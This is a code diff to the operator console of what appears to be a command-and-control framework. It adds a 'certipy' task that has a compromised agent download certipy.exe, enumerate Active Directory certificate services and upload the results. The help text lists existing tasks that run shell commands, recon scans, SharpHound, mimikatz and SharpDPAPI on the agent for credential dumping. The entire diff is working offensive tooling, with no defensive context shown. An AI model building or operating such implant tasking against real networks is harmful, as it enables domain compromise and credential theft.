@@ -17,6 +17,7 @@ Interact mode  (prompt changes to [agent_id] >):
   shell <command>             — queue a shell task (explicit)
   recon <ip_or_cidr>          — queue a recon scan
   sharphound                  — download + run SharpHound, upload ZIP
+  certipy <args>              — download certipy.exe + run, upload output files (ADCS enum)
   secretsdump <tool> <args>   — download tool + run (e.g. mimikatz.exe args)
   dpapi <tool> <args>         — download tool + run (e.g. SharpDPAPI.exe args)
   results                     — show task results for this agent
@@ -216,9 +217,17 @@ def handle_interact(line, agent_id):
                 print(f"[+] Recon task queued — task_id: {res['task_id']}")
 
     elif cmd == "sharphound":
-        res = _post("/task", {"agent_id": agent_id, "task_type": "sharphound", "instruction": "sharphound"})
+        res = _post("/task", {"agent_id": agent_id, "task_type": "sharphound", "instruction": arg or ""})
         if res:
             print(f"[+] SharpHound task queued — task_id: {res['task_id']}")
+
+    elif cmd == "certipy":
+        if not arg:
+            print("usage: certipy <args>  (e.g. certipy find -u user@domain -p Pass -dc-ip 10.0.0.1)")
+        else:
+            res = _post("/task", {"agent_id": agent_id, "task_type": "certipy", "instruction": arg})
+            if res:
+                print(f"[+] Certipy task queued — task_id: {res['task_id']}")
 
     elif cmd == "secretsdump":
         if not arg:
